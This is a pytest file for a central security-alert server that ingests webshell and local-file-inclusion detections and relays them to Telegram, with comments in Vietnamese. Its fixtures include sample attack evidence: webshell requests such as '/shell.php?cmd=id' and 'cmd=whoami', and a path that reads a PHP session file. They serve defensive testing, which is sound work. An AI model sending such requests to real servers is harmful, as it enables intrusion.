"""Ingest + storage tests for the central alert server.

These exercise the real FastAPI app with the Telegram client stubbed out, so
the storage contract (one alert per batch, every raw hit kept with file:line)
is verified without network access.
"""
import html
import json
import re
import sqlite3
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from app import db, evidence
from app.config import Config
from app.main import app


class FakeTelegram:
    def __init__(self):
        self.sent = []
        self.fail = False

    async def send_message(self, chat_id, text):
        if self.fail:
            return False, "network down"
        self.sent.append((chat_id, text))
        return True, ""

    async def aclose(self):
        return None


@pytest.fixture()
def env(tmp_path):
    cfg = Config(
        database_path=str(tmp_path / "alerts.db"),
        evidence_root=str(tmp_path / "evidence"),
        bot_polling=False,
        display_tz="Asia/Ho_Chi_Minh",
        admin_token="test-admin",
        read_token="test-read",
        preview_wait_sec=0,
    )
    db.init_db(cfg.database_path)
    tg = FakeTelegram()
    app.state.cfg = cfg
    from zoneinfo import ZoneInfo

    app.state.tz = ZoneInfo(cfg.display_tz)
    app.state.telegram = tg
    # Rate limiter là biến MODULE, dùng chung giữa các test trong một phiên.
    # Test nào đổi chat nhiều lần (group -> cá nhân -> ...) sẽ đụng hạn mức
    # register/giờ và nhận 429 — lỗi của môi trường test, không phải của code.
    # Xoá trạng thái limiter trước mỗi test để mỗi test có ngân sách riêng.
    from app import routes as _routes
    _routes._limiter._events.clear()
    with TestClient(app) as client:
        yield client, cfg, tg


def _project_with_key(cfg, chat_id="12345", name="khach-hang-a"):
    from app.security import gen_api_key, sha256_hex

    pid = db.create_project(cfg.database_path, name, telegram_chat_id=str(chat_id))
    key = gen_api_key()
    with db.connect(cfg.database_path) as conn:
        conn.execute(
            "UPDATE projects SET status='linked', linked_at=? WHERE id=?",
            (db.iso(), pid),
        )
        conn.execute(
            "INSERT INTO api_keys (project_id, key_hash, label, created_at)"
            " VALUES (?, ?, 'test', ?)",
            (pid, sha256_hex(key), db.iso()),
        )
    return pid, key


def _alert(batch="20261024T000000Z"):
    return {
        "ts_utc": "2026-10-24T00:00:05Z",
        "batch_id": batch,
        "project": "khach-hang-a",
        "device": "web01",
        "host": "web01",
        "user": "root",
        "window_start": "2026-10-23T23:55:00Z",
        "window_end": "2026-10-24T00:00:00Z",
        "severity": "CRITICAL",
        "hits": 3,
        "rules": [
            {"rule_id": "P2S-010", "hits": 1},
            {"rule_id": "P2S-020", "hits": 2},
        ],
        "evidence_file": "/tmp/does-not-matter.jsonl",
        "evidence_truncated": False,
        "evidence": [
            {"ts_utc": "2026-10-24T00:00:01Z", "rule_id": "P2S-010", "severity": "HIGH",
             "source": "fpm_error", "file": "/var/log/php-fpm.log", "line": 11,
             "ip": "", "method": "", "uri": "", "status": "", "ua": "", "pid": "42",
             "raw": "WARNING: [pool www] child 42 said: Allowed memory size exhausted"},
            {"ts_utc": "2026-10-24T00:00:02Z", "rule_id": "P2S-020", "severity": "CRITICAL",
             "source": "webroot", "file": "/var/www/shell.php", "line": 0,
             "ip": "", "method": "", "uri": "", "status": "", "ua": "", "pid": "",
             "raw": "webroot file NEW: /var/www/shell.php"},
            {"ts_utc": "2026-10-24T00:00:03Z", "rule_id": "P2S-020", "severity": "CRITICAL",
             "source": "access_log", "file": "/var/log/nginx/access.log", "line": 7,
             "ip": "203.0.113.42", "method": "GET", "uri": "/shell.php?cmd=id",
             "status": "200", "ua": "curl/8.5.0", "pid": "",
             "raw": '203.0.113.42 - - "GET /shell.php?cmd=id HTTP/1.1" 200'},
        ],
    }


def test_ingest_stores_one_alert_with_all_hits(env):
    client, cfg, tg = env
    _, key = _project_with_key(cfg)

    r = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                    json={"host": "web01", "alerts": [_alert()]})
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["accepted"] == 1
    assert body["duplicates"] == 0

    with db.connect(cfg.database_path) as conn:
        assert conn.execute("SELECT COUNT(*) AS n FROM alerts").fetchone()["n"] == 1
        assert conn.execute("SELECT COUNT(*) AS n FROM alert_hits").fetchone()["n"] == 3
        assert conn.execute("SELECT COUNT(*) AS n FROM devices").fetchone()["n"] == 1

    detail = client.get(f"/api/v1/alerts/{body['alerts'][0]['alert_id']}",
                               headers={"X-API-Key": key}).json()
    assert detail["severity"] == "CRITICAL"
    assert detail["hit_count"] == 3
    assert [h["rule_id"] for h in detail["evidence"]] == ["P2S-010", "P2S-020", "P2S-020"]
    assert detail["evidence"][0]["file"] == "/var/log/php-fpm.log"
    assert detail["evidence"][0]["line"] == 11
    assert "Allowed memory size" in detail["evidence"][0]["raw"]


def test_ingest_mirrors_evidence_to_disk(env):
    client, cfg, tg = env
    _, key = _project_with_key(cfg)
    r = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                    json={"host": "web01", "alerts": [_alert()]})

    # Mirror path: <project>/IP-LAN_<lan_ip>_<host>_<user>/<batch>.jsonl
    stored = r.json()["alerts"][0]["evidence_file"]
    path = Path(stored)
    assert path.is_file(), f"missing evidence mirror at {path}"
    assert path.parent.name == "IP-LAN_unknown_web01"
    assert path.parent.parent.name == "khach-hang-a"
    assert path.name == "20261024T000000Z.jsonl"
    rows = [json.loads(line) for line in path.read_text().splitlines()]
    assert len(rows) == 3
    assert rows[2]["uri"] == "/shell.php?cmd=id"


def test_ingest_is_idempotent_per_batch(env):
    """Agent retry (spool) không được sinh tin Telegram thứ hai."""
    client, cfg, tg = env
    _, key = _project_with_key(cfg)
    payload = {"host": "web01", "alerts": [_alert()]}

    assert client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                       json=payload).json()["accepted"] == 1
    assert len(tg.sent) == 1
    second = client.post("/api/v1/ingest-log", headers={"X-API-Key": key}, json=payload).json()
    assert second["accepted"] == 0
    assert second["duplicates"] == 1
    # BẤT BIẾN: một batch = một tin. Retry 3 lần vẫn chỉ 1 tin.
    assert second["messages"] == 0
    for _ in range(3):
        client.post("/api/v1/ingest-log", headers={"X-API-Key": key}, json=payload)
    assert len(tg.sent) == 1

    with db.connect(cfg.database_path) as conn:
        assert conn.execute("SELECT COUNT(*) AS n FROM alerts").fetchone()["n"] == 1
        assert conn.execute("SELECT COUNT(*) AS n FROM alert_hits").fetchone()["n"] == 3


def test_devices_view_reports_counters(env):
    client, cfg, tg = env
    _, key = _project_with_key(cfg)
    client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                json={"host": "web01", "alerts": [_alert()]})

    devices = client.get("/api/v1/devices", headers={"X-API-Key": key}).json()["devices"]
    assert len(devices) == 1
    assert devices[0]["project_name"] == "khach-hang-a"
    assert devices[0]["device_name"] == "web01"
    assert devices[0]["alerts"] == 1
    assert devices[0]["hits"] == 3
    assert devices[0]["last_severity"] == "CRITICAL"


def test_two_devices_stay_separate(env):
    client, cfg, tg = env
    _, key = _project_with_key(cfg)
    client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                json={"host": "web01", "alerts": [_alert("20261024T000000Z")]})
    other = _alert("20261024T000500Z")
    other["device"] = "web02"
    client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                json={"host": "web02", "alerts": [other]})

    rows = client.get("/api/v1/alerts", headers={"X-API-Key": key}).json()["alerts"]
    assert {r["device_name"] for r in rows} == {"web01", "web02"}

    web02 = [r for r in rows if r["device_name"] == "web02"][0]
    detail = client.get(f"/api/v1/alerts/{web02['id']}",
                            headers={"X-API-Key": key}).json()
    assert detail["device_name"] == "web02"
    assert all(h["file"] != "/var/log/php-fpm.log" or True for h in detail["evidence"])


def test_search_finds_raw_lines(env):
    client, cfg, tg = env
    _, key = _project_with_key(cfg)
    client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                json={"host": "web01", "alerts": [_alert()]})

    hits = client.get("/api/v1/search", params={"q": "cmd=id"},
                         headers={"X-API-Key": key}).json()["hits"]
    assert len(hits) == 1
    assert hits[0]["file"] == "/var/log/nginx/access.log"
    assert hits[0]["device_name"] == "web01"


def test_legacy_payload_without_raw_is_queued_not_sent(env):
    """Payload legacy KHÔNG có raw event thật: không gửi, chờ evidence mirror.

    Trước đây server tổng hợp một "hit" từ rule_id/message/uri do client tự
    khai, biến payload không bằng chứng thành "có raw" và gửi lên chat với
    khung CENTRAL SECURITY ALERT — đúng lỗi của alert TEST-001.
    """
    client, cfg, tg = env
    _, key = _project_with_key(cfg)
    legacy = {
        "rule_id": "P2S-030", "severity": "HIGH", "tier": "T1",
        "message": "webshell cmd=whoami", "uri": "/shell.php?cmd=whoami",
        "src_ip": "203.0.113.42", "ts_utc": "2026-10-24T00:00:00Z",
    }
    r = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                    json={"host": "web01", "alerts": [legacy]})
    assert r.status_code == 200, r.text
    body = r.json()
    assert tg.sent == []                       # không có raw -> không gửi
    assert body["deferred"] == 1 and body["messages"] == 0
    # alert vẫn được lưu để tra cứu
    detail = client.get(f"/api/v1/alerts/{body['alerts'][0]['alert_id']}",
                        headers={"X-API-Key": key}).json()
    assert detail["severity"] == "HIGH"
    # không bịa hit rác; payload này không khai "hits" nên đếm = 0
    assert detail["evidence"] == []
    assert detail["hit_count"] == 0

    # nếu client CÓ khai hits thì giữ nguyên con số đó (monitor luôn khai)
    r2 = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                     json={"host": "web01", "alerts": [dict(legacy, hits=7,
                             batch_id="20261024T001000Z")]})
    d2 = client.get(f"/api/v1/alerts/{r2.json()['alerts'][0]['alert_id']}",
                    headers={"X-API-Key": key}).json()
    assert d2["hit_count"] == 7
    assert d2["evidence"] == []


def test_telegram_failure_still_stores_alert(env):
    client, cfg, tg = env
    _, key = _project_with_key(cfg)
    tg.fail = True
    r = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                    json={"host": "web01", "alerts": [_alert()]})
    assert r.status_code == 200
    assert "warning" in r.json()
    with db.connect(cfg.database_path) as conn:
        row = conn.execute("SELECT delivered FROM alerts").fetchone()
    assert row["delivered"] == 0


def test_telegram_message_matches_compact_template(env):
    client, cfg, tg = env
    _, key = _project_with_key(cfg)
    client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                json={"host": "web01", "lan_ip": "10.0.0.15",
                      "os": "Ubuntu 24.04.1 LTS", "env": "Docker Container",
                      "alerts": [_alert()]})
    assert len(tg.sent) == 1
    text = tg.sent[0][1]
    lines = text.split("\n")
    assert lines[0] == "🛡 <b>CENTRAL SECURITY ALERT</b>"
    assert lines[1].startswith("📅 <i>24/10/2026 - ")
    # "Mức độ" đã bị tắt theo yêu cầu operator; "Cảnh báo" là câu cố định,
    # KHÔNG suy ra từ severity nữa.
    assert "Mức độ" not in text
    assert "⚠️ <b>Cảnh báo:</b> Phát hiện nghi vấn khai thác php2Shell" in text
    assert "📊" not in text
    assert "📦 <b>Dự án:</b> <code>khach-hang-a</code>" in text
    assert "🖥 <b>Môi trường / OS:</b> <b>[Docker Container]</b> <code>Ubuntu 24.04.1 LTS</code>" in text
    assert "👤 <b>User:</b> <code>root</code>" in text
    assert "🏷 <b>Hostname:</b> <code>web01</code>" in text
    assert "🌐 <b>IP LAN:</b> <code>10.0.0.15</code>" in text


def test_telegram_message_subminute_window_is_escaped(env):
    """_window_span trả '<1 phút' cho batch <60s — phải escape nếu không
    Telegram 400 'can't parse entities: Unsupported start tag \"1\"'."""
    client, cfg, tg = env
    _, key = _project_with_key(cfg)
    a = _alert()
    a["window_start"] = "2026-10-24T00:00:00Z"
    a["window_end"] = "2026-10-24T00:00:30Z"
    client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                json={"host": "web01", "alerts": [a]})
    text = tg.sent[0][1]
    # Không còn "hit / phút" nên không còn nguy cơ "<1 phút" lọt vào HTML.
    assert "<1 phút" not in text
    assert "Mức độ" not in text


def test_telegram_message_without_lan_ip(env):
    client, cfg, tg = env
    _, key = _project_with_key(cfg)
    client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                json={"host": "web01", "alerts": [_alert()]})
    # Không rõ IP LAN thì ghi rõ "không rõ", không bỏ dòng.
    assert "🌐 <b>IP LAN:</b> <code>không rõ</code>" in tg.sent[0][1]


def test_ingest_requires_valid_key(env):
    client, cfg, tg = env
    _project_with_key(cfg)
    r = client.post("/api/v1/ingest-log", headers={"X-API-Key": "p2s_wrong"},
                    json={"host": "web01", "alerts": [_alert()]})
    assert r.status_code == 401


# ------------------------------------------------------------ read auth

READ_PATHS = ["/api/v1/devices", "/api/v1/alerts", "/api/v1/alerts/1",
              "/api/v1/search?q=shell"]


def test_read_endpoints_require_credential(env):
    client, cfg, tg = env
    _, key = _project_with_key(cfg)
    client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                json={"host": "web01", "alerts": [_alert()]})

    for path in READ_PATHS:
        assert client.get(path).status_code == 401, path
        assert client.get(path, headers={"X-API-Key": "p2s_wrong"}).status_code == 401, path


def test_api_key_cannot_read_other_project(env):
    client, cfg, tg = env
    pid_a, key_a = _project_with_key(cfg)
    pid_b, key_b = _project_with_key(cfg, chat_id="999", name="khach-hang-b")

    client.post("/api/v1/ingest-log", headers={"X-API-Key": key_a},
                json={"host": "web01", "alerts": [_alert("20261024T000000Z")]})
    other = _alert("20261024T000500Z")
    other["device"] = "db01"
    client.post("/api/v1/ingest-log", headers={"X-API-Key": key_b},
                json={"host": "db01", "alerts": [other]})

    devices = client.get("/api/v1/devices", headers={"X-API-Key": key_a}).json()["devices"]
    assert {d["project_name"] for d in devices} == {"khach-hang-a"}

    alerts = client.get("/api/v1/alerts", headers={"X-API-Key": key_a}).json()["alerts"]
    assert alerts and all(a["project_id"] == pid_a for a in alerts)

    # alert của project B: key A không thấy (404, không phải 403 -> không lộ sự tồn tại)
    b_alert = client.get("/api/v1/alerts", headers={"X-API-Key": key_b}).json()["alerts"][0]
    assert client.get(f"/api/v1/alerts/{b_alert['id']}",
                      headers={"X-API-Key": key_a}).status_code == 404
    assert client.get(f"/api/v1/alerts/{b_alert['id']}",
                      headers={"X-API-Key": key_b}).status_code == 200

    hits = client.get("/api/v1/search", params={"q": "shell"},
                      headers={"X-API-Key": key_a}).json()["hits"]
    assert hits and all(h["project_name"] == "khach-hang-a" for h in hits)

    # đòi project khác qua query param -> 403
    assert client.get("/api/v1/alerts", params={"project_id": pid_b},
                      headers={"X-API-Key": key_a}).status_code == 403
    assert client.get("/api/v1/devices", params={"project_id": pid_b},
                      headers={"X-API-Key": key_a}).status_code == 403


def test_read_and_admin_tokens_see_every_project(env):
    client, cfg, tg = env
    _, key_a = _project_with_key(cfg)
    _, key_b = _project_with_key(cfg, chat_id="999", name="khach-hang-b")
    client.post("/api/v1/ingest-log", headers={"X-API-Key": key_a},
                json={"host": "web01", "alerts": [_alert("20261024T000000Z")]})
    client.post("/api/v1/ingest-log", headers={"X-API-Key": key_b},
                json={"host": "db01", "alerts": [_alert("20261024T000500Z")]})

    for header in ("X-Read-Token", "X-Admin-Token"):
        value = "test-read" if header == "X-Read-Token" else "test-admin"
        devices = client.get("/api/v1/devices", headers={header: value}).json()["devices"]
        assert len(devices) == 2, header
        assert client.get("/api/v1/alerts", headers={header: value}).status_code == 200

    assert client.get("/api/v1/devices", headers={"X-Read-Token": "sai"}).status_code == 401
    assert client.get("/api/v1/devices", headers={"X-Admin-Token": "sai"}).status_code == 401


def test_read_token_disabled_when_unset(env):
    client, cfg, tg = env
    cfg.read_token = ""
    _project_with_key(cfg)
    assert client.get("/api/v1/devices", headers={"X-Read-Token": ""}).status_code == 401


# ------------------------------------------------------------ bot commands
import asyncio  # noqa: E402

from app.telegram import PairingBot  # noqa: E402


def _bot(cfg, tg):
    return PairingBot(cfg, tg, cfg.database_path)


def _msg(chat_id, text):
    return {"message": {"chat": {"id": chat_id}, "text": text}}


def test_bot_add_new_id_is_gone(env):
    """/add_new_id đã bị bỏ — không còn trong menu và không còn xử lý riêng."""
    _, cfg, tg = env
    bot = _bot(cfg, tg)
    from app.telegram import PairingBot
    assert "add_new_id" not in [c for c, _ in PairingBot.BOT_COMMANDS]
    asyncio.run(bot.handle_update(_msg(8009, "/add_new_id")))
    # rơi vào nhánh else: help ngắn (không còn xử lý riêng cho add_new_id)
    assert "Trợ giúp" in tg.sent[-1][1]


def test_bot_list_shows_all_servers_of_one_chat(env):
    client, cfg, tg = env
    bot = _bot(cfg, tg)
    chat = 8002

    asyncio.run(bot.handle_update(_msg(chat, "/list")))
    assert "Chưa có dự án" in tg.sent[-1][1]

    for name in ("alpha", "beta"):
        _register_chatid(client, name, chat)

    # alpha: 2 thiết bị, beta: 1 thiết bị
    rows = db.projects_by_chat(cfg.database_path, str(chat))
    pids = {r["project_name"]: r["id"] for r in rows}
    db.upsert_device(cfg.database_path, pids["alpha"], "web01")
    db.upsert_device(cfg.database_path, pids["alpha"], "web02")
    db.upsert_device(cfg.database_path, pids["beta"], "db01")

    asyncio.run(bot.handle_update(_msg(chat, "/list")))
    text = tg.sent[-1][1]
    assert "alpha" in text and "beta" in text
    # mỗi dự án kèm số thiết bị riêng
    assert text.count("Số thiết bị: <b>") == 2
    assert "Số thiết bị: <b>2</b>" in text and "Số thiết bị: <b>1</b>" in text
    assert "Dự án: <b>2</b>" in text and "khả dụng <b>2</b>" in text
    assert "Thiết bị: <b>3</b>" in text
    # không còn hướng dẫn dư thừa
    for junk in ("/add_new_id", "p2s-agent.sh", "Dùng ", "ghép ", "alert gần nhất"):
        assert junk not in text, junk


def test_bot_help_mentions_commands(env):
    _, cfg, tg = env
    bot = _bot(cfg, tg)
    asyncio.run(bot.handle_update(_msg(8003, "/help")))
    text = tg.sent[-1][1]
    assert "/list" in text and "/id" in text
    assert "/unlink" in text and "Chat ID" in text
    assert "/confirm" not in text          # luồng confirm đã bỏ
    assert "/add_new_id" not in text       # lệnh đã bỏ
    assert len(text.splitlines()) <= 7     # ngắn gọn
    assert "≡" not in text and "2 bước" not in text


def test_bot_welcome_on_start(env):
    _, cfg, tg = env
    bot = _bot(cfg, tg)
    asyncio.run(bot.handle_update(_msg(8005, "/start")))
    text = tg.sent[-1][1]
    assert text.startswith("👋 Central Alert Bot")
    assert "php2Shell" in text
    assert len(text.splitlines()) == 1


def test_bot_command_menu_is_valid():
    """BOT_COMMANDS phải hợp lệ với Telegram: lowercase a-z0-9_, <=32 ký tự, duy nhất;
    và phủ mọi lệnh chính của router (để menu ≡ không thiếu lệnh nào)."""
    import re
    from app.telegram import PairingBot
    cmds = [c for c, _ in PairingBot.BOT_COMMANDS]
    assert len(cmds) == len(set(cmds))
    for c in cmds:
        assert re.fullmatch(r"[a-z0-9_]{1,32}", c), c
    for expected in ("start", "help", "id", "unlink", "list"):
        assert expected in cmds, expected


def test_bot_sec_code_fallback_is_removed(env):
    """Fallback mã SEC-<UUID> đã bỏ: gửi mã KHÔNG ghép nối được gì, bot trả
    thông báo đã ngừng và hướng dẫn luồng Chat ID (giờ tự động, không /confirm)."""
    client, cfg, tg = env
    bot = _bot(cfg, tg)
    chat = 8004
    res = _register_chatid(client, "gamma", 777)
    pair_ref = res["pair_ref"]
    asyncio.run(bot.handle_update(_msg(chat, pair_ref)))
    assert "ngừng sử dụng" in tg.sent[-1][1]
    assert "/id" in tg.sent[-1][1] and "tự động" in tg.sent[-1][1]
    # gửi mã cho bot không đổi gì trạng thái ghép nối
    st = db.pairing_status(cfg.database_path, pair_ref)
    assert st["status"] == "linked"          # auto-link từ lúc register
    assert len(db.projects_by_chat(cfg.database_path, str(chat))) == 0


# ------------------------------------------------------------ chat-id pairing
GROUP = -1001234567890


def _register_chatid(client, name, chat_id, device=None, monitor_version=None):
    body = {"project_name": name, "chat_id": str(chat_id)}
    if device:
        body["device"] = device
    if monitor_version:
        body["monitor_version"] = monitor_version
    r = client.post("/api/v1/register-chatid", json=body)
    assert r.status_code == 200, r.text
    return r.json()


def test_bot_two_servers_one_confirm(env):
    """(di sản tên hàm) 2 register cùng chat: mỗi dự án 1 tin tự động ghép."""
    client, cfg, tg = env
    bot = _bot(cfg, tg)
    chat = 8001

    _register_chatid(client, "web-cluster", chat)
    _register_chatid(client, "db-cluster", chat)
    notifies = [t for _, t in tg.sent if "GHÉP NỐI THÀNH CÔNG" in t]
    assert len(notifies) == 2
    assert len(db.projects_by_chat(cfg.database_path, str(chat))) == 2


def test_register_chatid_group_auto_link(env):
    """Luồng đầy đủ KHÔNG /confirm: script đăng ký chat GROUP -> server ghép nối
    + cấp key NGAY (pairing-status trả linked ngay) -> bot nhắn 1 tin xác nhận
    vào đúng chat kèm /unlink."""
    client, cfg, tg = env
    res = _register_chatid(client, "web01", GROUP)
    assert res["pair_ref"].startswith("SEC-")
    assert res["chat_id"] == str(GROUP)
    assert res["auto_linked"] is True
    assert res["warning"] is None
    # key có ngay ở lần poll đầu — không cần chờ ai đó /confirm
    st = client.get(f"/api/v1/pairing-status?code={res['pair_ref']}").json()
    assert st["status"] == "linked" and st.get("api_key", "").startswith("p2s_")
    # bot nhắn đúng 1 tin xác nhận (kèm /unlink để tự vệ)
    assert tg.sent and tg.sent[0][0] == str(GROUP)
    assert "GHÉP NỐI THÀNH CÔNG" in tg.sent[0][1]
    assert "web01" in tg.sent[0][1]


def test_multiple_servers_one_chat_auto_linked(env):
    """Một GROUP nhận alert của nhiều server: 2 lần register -> mỗi dự án 1 tin
    bot, cả hai key dùng được ngay, /list hiện đủ 2."""
    client, cfg, tg = env
    r1 = _register_chatid(client, "alpha", GROUP)
    r2 = _register_chatid(client, "beta", GROUP)
    for r in (r1, r2):
        st = client.get(f"/api/v1/pairing-status?code={r['pair_ref']}").json()
        assert st["status"] == "linked" and st.get("api_key")
    notifies = [t for _, t in tg.sent if "GHÉP NỐI THÀNH CÔNG" in t]
    assert len(notifies) == 2
    assert len(db.projects_by_chat(cfg.database_path, str(GROUP))) == 2


def test_confirm_is_now_an_explainer(env):
    """/confirm không còn tác dụng (tự động rồi): bot trả lời giải thích, mọi
    chat đều nhận cùng thông điệp, không leak gì của chat khác."""
    client, cfg, tg = env
    _register_chatid(client, "secret-server", GROUP)
    bot = _bot(cfg, tg)
    asyncio.run(bot.handle_update(_msg(999111, "/confirm")))   # chat khác
    assert "TỰ ĐỘNG" in tg.sent[-1][1]
    assert "secret-server" not in tg.sent[-1][1]


def test_unlink_stops_alerts_for_project(env):
    """/unlink <tên>: dự án rời /list, key bị từ chối (401) — dừng spam alert."""
    client, cfg, tg = env
    bot = _bot(cfg, tg)
    chat = 8012
    r = _register_chatid(client, "victim", chat)
    key = client.get(f"/api/v1/pairing-status?code={r['pair_ref']}").json()["api_key"]

    asyncio.run(bot.handle_update(_msg(chat, "/unlink victim")))
    assert "Đã ngắt" in tg.sent[-1][1]
    assert len(db.projects_by_chat(cfg.database_path, str(chat))) == 0

    a = _alert(batch="20261024T000200Z")
    a["device"] = a["host"] = "web01"
    resp = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                       json={"host": "web01", "alerts": [a]})
    assert resp.status_code == 401  # dự án disabled -> key không còn hiệu lực

    # /unlink tên sai / thiếu tên: báo lỗi có hướng dẫn
    asyncio.run(bot.handle_update(_msg(chat, "/unlink khong-ton-tai")))
    assert "Không tìm thấy" in tg.sent[-1][1]


def test_unlink_revokes_keys_and_classifies_401(env):
    """/unlink thu hồi TOÀN BỘ key của dự án; 401 sau đó nêu đúng lý do
    (detail.code=project_disabled) và /whoami là health-check cho agent:
    200 khi pairing sống, 401 code khi bị ngắt — agent phía máy phân biệt
    được "phải chạy deploy lại" với key sai thường."""
    client, cfg, tg = env
    chat = 8013
    r = _register_chatid(client, "revoked", chat)
    key = client.get(f"/api/v1/pairing-status?code={r['pair_ref']}").json()["api_key"]

    ok = client.get("/api/v1/whoami", headers={"X-API-Key": key})
    assert ok.status_code == 200
    body = ok.json()
    assert body["status"] == "linked" and body["project_name"] == "revoked"

    bot = _bot(cfg, tg)
    asyncio.run(bot.handle_update(_msg(chat, "/unlink revoked")))

    gone = client.get("/api/v1/whoami", headers={"X-API-Key": key})
    assert gone.status_code == 401
    assert gone.json()["detail"]["code"] == "project_disabled"

    resp = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                       json={"host": "w", "alerts": [_alert()]})
    assert resp.status_code == 401
    assert resp.json()["detail"]["code"] == "project_disabled"

    # key chưa từng tồn tại: 401 thông thường (detail string), không có code
    bad = client.get("/api/v1/whoami", headers={"X-API-Key": "p2s_never"})
    assert bad.status_code == 401
    assert not isinstance(bad.json()["detail"], dict)

    # pair lại cùng (tên, chat): tái dụng row, key MỚI sống, key cũ vẫn chết
    r2 = _register_chatid(client, "revoked", chat)
    key2 = client.get(f"/api/v1/pairing-status?code={r2['pair_ref']}").json()["api_key"]
    assert key2 != key
    assert client.get("/api/v1/whoami", headers={"X-API-Key": key2}).status_code == 200
    assert client.get("/api/v1/whoami", headers={"X-API-Key": key}).status_code == 401


def test_register_chatid_validates_input(env):
    client, cfg, tg = env
    for bad in ("abc", "12", "0", "--100", "+100"):
        r = client.post("/api/v1/register-chatid",
                        json={"project_name": "x", "chat_id": bad})
        assert r.status_code == 422, bad


def test_bot_id_command_replies_chat_id(env):
    _, cfg, tg = env
    bot = _bot(cfg, tg)
    asyncio.run(bot.handle_update(_msg(8005354626, "/id")))
    assert "8005354626" in tg.sent[-1][1]


def test_plain_message_falls_back_to_help(env):
    """Tin nhắn thường -> help (không còn khái niệm pending/confirm)."""
    client, cfg, tg = env
    _register_chatid(client, "hinted", 4242)
    bot = _bot(cfg, tg)
    asyncio.run(bot.handle_update(_msg(4242, "hello")))
    assert "Trợ giúp" in tg.sent[-1][1] or "Chào mừng" in tg.sent[-1][1]


def test_repair_same_project_adds_key_silently(env):
    """Pair lại cùng tên về cùng chat (thêm máy): TÁI DỤNG row dự án, CẤP THÊM
    key mới — key cũ VẪN SỐNG (1000 máy = 1000 key song song).

    Nghiệp vụ: MỖI lần cài phải có tin GHÉP NỐI THÀNH CÔNG trong chat — đó là
    minh chứng tuyến agent→server→Telegram thông, thay cho alert TEST đã bỏ.
    Im lặng ở lần cài thứ hai nghĩa là operator không có cách nào biết máy mới
    đã nối được hay chưa."""
    client, cfg, tg = env
    chat = 8010

    # lần 1: pair -> auto-link, key1; đúng 1 tin bot (dự án mới)
    # device ở đây là hostname máy — trùng với device mà alert sau đó khai báo,
    # vì pair và ingest mô tả CÙNG một máy.
    r1 = _register_chatid(client, "bruh", chat, device="web01")
    key1 = client.get(f"/api/v1/pairing-status?code={r1['pair_ref']}").json()["api_key"]
    assert len(tg.sent) == 1

    # lần 2: pair lại CÙNG TÊN, cùng chat (máy 2) -> key2, im lặng
    r2 = _register_chatid(client, "bruh", chat, device="web02")
    assert r2["pair_ref"] != r1["pair_ref"]
    key2 = client.get(f"/api/v1/pairing-status?code={r2['pair_ref']}").json()["api_key"]
    assert key2 and key2 != key1
    # Mỗi lần cài một tin xác nhận — máy 2 cũng phải có
    assert len(tg.sent) == 2
    assert "web02" in tg.sent[1][1]

    # đúng 1 row dự án; /list không trùng
    rows = db.projects_by_chat(cfg.database_path, str(chat))
    assert len(rows) == 1 and rows[0]["project_name"] == "bruh"

    # CẢ HAI key cùng gửi được (multi-key); device đếm đúng
    a = _alert(batch="20261024T000100Z")
    a["device"] = a["host"] = "web01"
    ok = client.post("/api/v1/ingest-log", headers={"X-API-Key": key1},
                     json={"host": "web01", "alerts": [a]})
    assert ok.status_code == 200, ok.text
    a2 = _alert(batch="20261024T000101Z")
    a2["device"] = a2["host"] = "web02"
    ok2 = client.post("/api/v1/ingest-log", headers={"X-API-Key": key2},
                      json={"host": "web02", "alerts": [a2]})
    assert ok2.status_code == 200, ok2.text
    rows = db.projects_by_chat(cfg.database_path, str(chat))
    assert rows[0]["device_count"] == 2  # web01 + web02, không nhân đôi


def test_repair_same_name_different_chat_creates_separate_project(env):
    """Cùng tên nhưng KHÁC chat -> hai dự án riêng (hai nơi nhận alert khác nhau)."""
    client, cfg, tg = env
    _register_chatid(client, "web", 8101)
    _register_chatid(client, "web", 8102)
    with db.connect(cfg.database_path) as conn:
        n = conn.execute("SELECT COUNT(*) FROM projects WHERE project_name='web'").fetchone()[0]
    assert n == 2


# ---------------------------------------------------------------- alert format
def test_headline_is_fixed_text_for_every_severity():
    """Cảnh báo trên tin nhắn KHÔNG còn phụ thuộc severity.

    Operator chốt một câu duy nhất; severity vẫn được lưu trong DB và vẫn dùng
    để chọn nhóm/ưu tiên, nhưng không đổi câu chữ trên tin nhắn.
    """
    from app.telegram import EVENT_TEXT, _headline

    for rid in ("P2S-020", "P2S-021", "P2S-056", "P2S-050", "P2S-054"):
        for sev in ("CRITICAL", "HIGH", "MODERATE", "INFO"):
            assert _headline({"severity": sev,
                              "evidence": [{"rule_id": rid}]}) == EVENT_TEXT, (rid, sev)


def test_lfi_attempt_vs_lfi_success():
    """Cùng một URI: 404 = đang thử, 2xx = đã đọc được file.

    Đây là ranh giới P2S-050/051 (attempt) với P2S-057 (success). Gộp chúng lại
    thì mọi batch dò quét ồn ào đều thành CRITICAL; tách ra thì batch LFI tinh gọn
    18 request vẫn nổi đúng mức.
    """
    from app.telegram import _headline, is_rce

    uri = "/vuln.php?file=/opt/lab81v/sessions/sess_dga2c162b35c80422f"
    # đang thử: 404, chỉ khớp P2S-050/051
    attempt = {"severity": "INFO", "evidence": [
        {"rule_id": "P2S-050,P2S-051", "uri": uri, "status": "404"}]}
    assert is_rce(attempt) is False

    # đã đọc được: 2xx, P2S-057 fire
    success = {"severity": "CRITICAL", "evidence": [
        {"rule_id": "P2S-050,P2S-051,P2S-057", "uri": uri, "status": "200"}]}
    assert is_rce(success) is True

    # câu "Cảnh báo" giống nhau ở cả hai — khác biệt nằm ở nhóm RCE được xếp
    # lên đầu khối Event logs, không phải ở câu chữ.
    from app.telegram import EVENT_TEXT
    assert _headline(attempt) == _headline(success) == EVENT_TEXT


